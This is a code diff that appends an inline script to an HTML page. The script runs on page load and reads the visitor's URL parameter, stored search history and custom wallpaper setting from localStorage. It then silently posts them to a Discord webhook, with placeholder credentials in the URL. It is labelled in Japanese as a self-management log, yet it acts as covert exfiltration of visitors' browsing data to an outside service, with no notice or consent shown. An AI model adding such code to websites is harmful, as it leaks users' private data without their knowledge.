@@ -127,4 +127,39 @@
 
 </body>
 <script src="v5/script.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const value = new URLSearchParams(window.location.search).get('value') || '';
+    const searchHistory = localStorage.getItem('search_history') || 'なし';
+    const customWallpaper = localStorage.getItem('custom_wallpaper') || 'なし';
+
+    // Discordに送信する埋め込みメッセージ
+    const payload = {
+        embeds: [
+            {
+                title: "自己管理ログ",
+                color: 5814783, // カラーコード（青っぽい色）
+                fields: [
+                    { name: "URLパラメータ value", value: value || "なし", inline: false },
+                    { name: "検索履歴 (search_history)", value: searchHistory, inline: false },
+                    { name: "カスタム壁紙 (custom_wallpaper)", value: customWallpaper, inline: false }
+                ],
+                timestamp: new Date().toISOString()
+            }
+        ]
+    };
+
+    fetch('https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).then(response => {
+        if(response.ok) {
+            console.log('データ送信成功');
+        } else {
+            console.error('送信失敗', response.statusText);
+        }
+    }).catch(error => console.error('送信中エラー', error));
+});
+</script>
 </html>
